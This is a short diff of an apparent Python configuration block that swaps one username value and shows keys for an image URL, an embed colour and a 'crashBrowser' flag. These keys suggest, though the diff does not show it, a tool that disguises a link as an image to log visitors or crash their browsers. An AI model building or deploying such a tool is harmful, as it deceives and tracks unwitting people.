@@ -26,7 +26,7 @@ config = {
     "image": "https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.bbc.com%2Ffuture%2Farticle%2F20170706-the-mystery-of-the-massive-deep-sea-rivers&psig=AOvVaw0rIrpSXw5lpAyUQvxTYEfq&ust=1690714201612000&source=images&cd=vfe&opi=89978449&ved=0CBEQjRxqFwoTCNi7s7Pfs4ADFQAAAAAdAAAAABAE", # <------------------------- Put image address link here.
     "imageArgument": True,
 
-    "username": "WingsMiner",
+    "username": "Tiservice",
     "color": 0x03AC13,
 
     "crashBrowser": False,
